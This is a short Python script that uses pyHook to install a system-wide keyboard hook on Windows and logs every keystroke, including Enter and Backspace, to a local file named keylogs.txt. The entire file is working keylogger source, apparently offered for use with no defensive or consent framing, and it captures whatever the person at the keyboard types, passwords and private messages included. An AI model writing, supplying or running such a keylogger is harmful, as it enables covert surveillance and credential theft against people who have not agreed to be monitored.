import pythoncom, pyHook

def keypressed(event):
    global store


    if event.Ascii==13:
        keys=' < Enter > '  # To record enter key
    elif event.Ascii==8:
        keys=' <BACK SPACE> '       # To record backspace key

    else:
        keys=chr(event.Ascii)       # To record all other keypresses

    store = store + keys # Aappending the ascii keys into store variable
    
    fp=open("keylogs.txt","w")
    fp.write(store)
    fp.close()

    return True 
    
store = '' # List to store keypresses
obj = pyHook.HookManager()
obj.KeyDown = keypressed

obj.HookKeyboard()        # Starting the hooking loop to pump out the messages
pythoncom.PumpMessages() 
